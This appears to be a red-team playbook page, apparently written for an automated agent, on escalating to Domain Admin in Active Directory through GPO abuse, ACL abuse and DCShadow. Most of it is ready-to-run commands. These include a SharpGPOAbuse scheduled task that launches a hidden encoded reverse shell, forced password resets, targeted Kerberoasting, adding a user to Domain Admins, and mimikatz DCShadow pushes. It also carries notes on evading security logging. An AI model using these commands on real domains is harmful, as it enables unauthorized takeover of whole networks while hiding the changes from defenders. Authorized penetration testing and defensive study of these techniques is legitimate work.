# GPO Abuse + ACL Abuse + DCShadow

**MITRE:** T1484.001, T1222, T1207 | **When:** BloodHound path involves GPO/ACL or DCShadow.

## GPO Abuse (T1484.001)

```bash
# Find GPOs where low-priv user has write rights:
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {
  $_.ActiveDirectoryRights -match "Write|Modify" -and
  $_.SecurityIdentifier -notmatch 'S-1-5-32-544|S-1-1-0|S-1-5-18'
} | Select-Object ObjectDN, SecurityIdentifier, ActiveDirectoryRights

# Remote via BloodHound: look for "GPO Write" edges in graph

# Exploit: SharpGPOAbuse (add local admin, scheduled task, or computer startup script)
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount normaluser --GPOName "VulnerableGPO"
SharpGPOAbuse.exe --AddComputerTask --TaskName "debug" \
  --Author CORP\Administrator \
  --Command "powershell.exe" \
  --Arguments "-nop -w hidden -enc <BASE64_REVERSE_SHELL>" \
  --GPOName "VulnerableGPO"

# Force immediate GPO update:
gpupdate /force  # on target machine
Invoke-GPUpdate -Computer <TARGET> -Force  # remotely
```

## ACL Abuse Chain (T1222)

```bash
# Find ACL misconfigurations via BloodHound:
# Key edges: GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AllExtendedRights

# ForceChangePassword (no current password needed):
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
# Remote:
net rpc password targetuser 'NewPass123!' -U "corp.local\normaluser%Password!" -S <DC_IP>

# GenericAll/GenericWrite on User -> Targeted Kerberoasting:
# Add SPN to target account, then Kerberoast it
Set-DomainObject -Identity targetuser -SET @{serviceprincipalname='fake/spn'}
GetUserSPNs.py corp.local/normaluser:'Password!' -dc-ip <DC_IP>

# GenericWrite on Group -> Add self to privileged group:
Add-DomainGroupMember -Identity 'Domain Admins' -Members normaluser

# WriteDACL on object -> Add GenericAll rights to self:
Add-DomainObjectAcl -TargetIdentity targetuser \
  -PrincipalIdentity normaluser -Rights All

# WriteOwner -> Take ownership then add rights:
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity normaluser
Add-DomainObjectAcl -TargetIdentity targetuser \
  -PrincipalIdentity normaluser -Rights All
```

## DCShadow (T1207) - Stealth DC Simulation

```bash
# Requires: Domain Admin (to register fake DC) OR DA-equivalent rights
# Registers attacker host as fake DC, pushes arbitrary AD changes
# Changes bypass standard audit logging (DC-to-DC replication logs only)

# mimikatz:
# Window 1 (attacker machine registered as DC):
# lsadump::dcshadow /object:normaluser /attribute:primaryGroupID /value:512
# (512 = Domain Admins group ID)

# Window 2 (push the change):
# lsadump::dcshadow /push

# Common use cases:
# - Add user to Domain Admins (primaryGroupID=512)
# - Set SIDHistory to Enterprise Admins SID
# - Mark account with not-expiring password (userAccountControl)
# - Add SPN for Kerberoasting (after DCShadow, remove SPN)

# Detection bypass notes:
# Changes replicated via DRS protocol (not LDAP events)
# Security logs on attacked DC won't show these changes
# Only visible in replication monitoring or Advanced Audit of DRS
```

**Evidence:** GPO applied (local admin confirmed on target) OR ACL chain traced to DA group membership.

**Signal:** `emit_signal VULN_CONFIRMED "GPO/ACL abuse -> DA escalation on <domain>" "main/redteam" 0.95`
